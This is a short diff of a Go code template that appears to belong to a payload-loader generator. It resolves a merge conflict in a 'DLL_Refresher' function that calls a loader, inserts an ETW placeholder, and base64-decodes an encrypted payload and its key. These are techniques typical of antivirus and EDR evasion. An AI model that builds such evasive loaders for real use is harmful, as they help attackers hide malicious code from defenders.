@@ -342,14 +342,8 @@ func DLL_Refresher() string {
 		if {{.Variables.Version}} == "10.0" {
 			{{.Variables.loader}}()
 		}
-<<<<<<< HEAD
 		{{.Variables.ETW}}
 		{{.Variables.ciphertext}}
-=======
-		{{.Variables.b64_string1name}} := "{{.Variables.b64_string1value}}"
-		{{.Variables.b64_string2name}} := "{{.Variables.b64_string2value}}"
-		{{.Variables.fullciphertext}} := {{.Variables.b64_string1name}} + {{.Variables.b64_string2name}} 
->>>>>>> 2be2a036f73846a9aba50e30d2fd9fc2b2184aa4
 		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})
 
 		{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
